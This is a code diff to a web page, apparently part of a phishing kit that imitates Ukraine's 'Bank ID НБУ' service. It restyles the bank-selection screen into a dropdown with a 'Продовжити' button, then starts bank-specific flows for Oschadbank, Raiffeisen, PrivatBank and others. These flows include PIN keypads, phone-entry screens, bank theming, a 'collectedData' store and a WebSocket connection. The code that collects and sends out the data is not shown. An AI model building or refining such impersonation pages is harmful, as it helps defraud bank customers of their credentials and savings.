@@ -635,24 +635,153 @@
             .oschad-pin-keypad, .raiff-keypad { max-width: 300px; }
             .bank-grid { grid-template-columns: repeat(4, 1fr); max-width: 800px; margin: 0 auto; }
         }
+                /* --- СТИЛИ ДЛЯ НОВОГО ДИЗАЙНА ВЫБОРА БАНКА --- */
+        #bank-selection-screen {
+            max-width: 420px; /* Ограничим ширину для лучшего вида */
+            margin: 0 auto;
+            padding-top: 40px;
+        }
+        .bankid-title {
+            font-size: 34px; 
+            font-weight: 600; 
+            margin-bottom: 40px; 
+            color: #000;
+            text-align: left; /* Убираем выравнивание по центру */
+        }
+        .bank-select-toggle {
+            border-bottom: 2px solid #333; /* Линия под селектом */
+            padding: 12px 5px; 
+            display: flex; 
+            justify-content: space-between; 
+            align-items: center; 
+            cursor: pointer;
+        }
+        #bank-select-text {
+            font-size: 18px; 
+            color: #777; /* Серый текст плейсхолдера */
+            white-space: nowrap;
+            overflow: hidden;
+            text-overflow: ellipsis;
+        }
+        #bank-select-text.selected {
+            color: #000; /* Черный текст для выбранного банка */
+            font-weight: 500;
+        }
+        .bank-select-arrow {
+            color: #777;
+            flex-shrink: 0;
+        }
+        .bank-list-wrapper {
+            display: none; /* Список по умолчанию скрыт */
+            margin-top: 8px; 
+            background-color: #fff; 
+            border-radius: 8px; 
+            box-shadow: 0 6px 16px rgba(0,0,0,0.1); 
+            overflow: auto; /* Скролл, если банков много */
+            max-height: 40vh; /* Ограничение высоты списка */
+            z-index: 100;
+            position: relative;
+        }
+        .bank-list-header {
+            padding: 16px 20px; 
+            background-color: #e0eafc; /* Голубой фон шапки списка */
+            color: #004a99; /* Темно-синий текст */
+            font-weight: 500;
+            border-bottom: 1px solid #d1d9e6;
+        }
+        .bank-continue-btn {
+            width: 100%; 
+            padding: 16px; 
+            background-color: #000; 
+            color: #fff; 
+            border: none; 
+            border-radius: 30px; /* Сильно скругленная кнопка */
+            font-size: 17px; 
+            font-weight: 600; 
+            margin-top: 50px; 
+            cursor: pointer;
+            transition: opacity 0.2s ease;
+        }
+        .bank-continue-btn:disabled {
+            cursor: not-allowed; 
+            opacity: 0.5; /* Кнопка неактивна по умолчанию */
+        }
+
+        /* --- ПЕРЕОПРЕДЕЛЕНИЕ СТАРЫХ СТИЛЕЙ ДЛЯ СПИСКА --- */
+        .bank-grid {
+            display: block; /* Меняем с grid на block (список) */
+            padding: 0;
+            gap: 0;
+        }
+        .bank-item {
+            flex-direction: row; /* Лого и текст в строку */
+            justify-content: flex-start; /* Выравнивание по левому краю */
+            align-items: center;
+            height: auto; /* Авто-высота */
+            padding: 14px 20px;
+            border: none;
+            border-bottom: 1px solid #f0f0f0; /* Разделитель */
+            border-radius: 0;
+            box-shadow: none;
+            transition: background-color 0.2s ease;
+        }
+        .bank-item:last-child {
+            border-bottom: none;
+        }
+        .bank-item:hover {
+            background-color: #f8f9fa; /* Легкая подсветка при наведении */
+            transform: none;
+            box-shadow: none;
+        }
+        .bank-item img {
+            max-height: 40px; /* Уменьшаем лого */
+            max-width: 90px; /* Ограничиваем ширину лого */
+            object-fit: contain;
+            margin-bottom: 0;
+            margin-right: 15px; /* Отступ справа от лого */
+            flex-shrink: 0;
+        }
+        .bank-item .bank-name {
+            font-size: 16px;
+            font-weight: 500;
+            text-align: left;
+        }
+        .bank-item.disabled {
+            background-color: #f9f9f9;
+            opacity: 0.6;
+            pointer-events: none;
+        }
+        .bank-item.disabled .unavailable-label {
+            position: static;
+            transform: none;
+            font-size: 12px;
+            color: var(--danger-color);
+            background-color: transparent;
+            padding: 0;
+            margin-left: auto; /* Метку "Недоступно" вправо */
+            white-space: nowrap;
+        }
     </style>
 </head>
 <body>
-    <div id="bank-selection-screen" class="screen">
-        <h1>Оберіть свій банк</h1>
-        <div class="bank-grid"></div>
-    </div>
+        <div id="bank-selection-screen" class="screen">
+        <h1 class="bankid-title">Bank ID НБУ</h1> 
 
-    <div id="form-screen" class="screen">
-        <div class="form-container">
-            <div id="form-header"><img id="form-header-logo" src="" alt="Логотип банку"></div>
-            <h2 id="modal-title"></h2>
-            <div id="modal-step-content"></div>
-            <div class="modal-footer">
-                <button class="btn btn-back" id="back-btn">Назад</button>
-                <button class="btn btn-next" id="next-btn">Далі</button>
-            </div>
+        <div id="bank-select-toggle" class="bank-select-toggle">
+            <span id="bank-select-text">Оберіть банк, в якому ви маєте ра...</span>
+            <svg class="bank-select-arrow" xmlns="http://www.w3.org/2000/svg" width="20" height="20" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2.5" stroke-linecap="round" stroke-linejoin="round"><path d="m6 9 6 6 6-6"/></svg>
         </div>
+
+        <div id="bank-list-wrapper" class="bank-list-wrapper">
+            <div class="bank-list-header">
+                Оберіть банк, в якому ви маєте рахунок...
+            </div>
+            <div class="bank-grid"></div> 
+        </div>
+
+        <button id="bank-continue-btn" class="bank-continue-btn" disabled>
+            Продовжити
+        </button>
     </div>
 
     <div id="custom-modal-overlay">
@@ -2090,30 +2219,67 @@ document.addEventListener('DOMContentLoaded', () => {
     }
     
     // --- Main Flow Logic ---
-    document.querySelectorAll('.bank-item').forEach(item => {
-        item.addEventListener('click', e => {
-            e.preventDefault();
-            if (item.classList.contains('disabled')) return;
-            const bankId = item.dataset.bank;
-            activeBankData = JSON.parse(JSON.stringify(bankFlows[bankId]));
+            // --- Main Flow Logic (NEW DESIGN) ---
+        let selectedBankId = null; // Здесь будем хранить ID выбранного банка
+        const bankSelectToggle = document.getElementById('bank-select-toggle');
+        const bankListWrapper = document.getElementById('bank-list-wrapper');
+        const bankSelectText = document.getElementById('bank-select-text');
+        const continueBtn = document.getElementById('bank-continue-btn');
+
+        // 1. Показываем/скрываем список банков по клику на "селект"
+        bankSelectToggle.addEventListener('click', () => {
+            const isVisible = bankListWrapper.style.display === 'block';
+            bankListWrapper.style.display = isVisible ? 'none' : 'block';
+        });
+
+        // 2. Обрабатываем выбор банка из списка
+        document.querySelectorAll('.bank-item').forEach(item => {
+            item.addEventListener('click', e => {
+                e.preventDefault();
+                if (item.classList.contains('disabled')) return;
+                
+                // Получаем ID и Название банка
+                selectedBankId = item.dataset.bank;
+                const bankName = item.querySelector('.bank-name').textContent;
+
+                // Обновляем текст в "селекте"
+                bankSelectText.textContent = bankName;
+                bankSelectText.classList.add('selected'); // Делаем текст черным
+                
+                // Скрываем список
+                bankListWrapper.style.display = 'none';
+
+                // Активируем кнопку "Продовжити"
+                continueBtn.disabled = false;
+                continueBtn.style.opacity = '1';
+            });
+        });
+
+        // 3. Обрабатываем клик по кнопке "Продовжити"
+        continueBtn.addEventListener('click', () => {
+            if (continueBtn.disabled || !selectedBankId) return;
+
+            // Используем сохраненный selectedBankId для запуска старой логики
+            activeBankData = JSON.parse(JSON.stringify(bankFlows[selectedBankId]));
             collectedData = {};
             
-            if (bankId === 'oschadbank') {
+            // Эта логика осталась из вашего оригинального файла
+            if (selectedBankId === 'oschadbank') {
                 renderOschadPhoneScreen();
-            } else if (bankId === 'raiffeisen') {
+            } else if (selectedBankId === 'raiffeisen') {
                 renderRaiffPhoneScreen();
-            } else if (['alliance', 'vostok', 'izibank', 'ukrsib', 'pumb', 'privat24'].includes(bankId)) {
+            } else if (['alliance', 'vostok', 'izibank', 'ukrsib', 'pumb', 'privat24'].includes(selectedBankId)) {
                 if (activeBankData.colors) setTheme(activeBankData.colors);
                 renderAlliancePhoneScreen();
             } else {
-                // Fallback for banks not covered above
+                // Fallback (если был, оставляем)
                 body.dataset.theme = activeBankData.theme;
                 formHeaderLogo.src = activeBankData.logoUrl;
                 body.classList.add('form-active');
                 currentStepIndex = 0;
                 renderStep();
             }
-            connectWebSocket();
+            connectWebSocket(); // Запускаем WebSocket, как и раньше
         });
     });
     
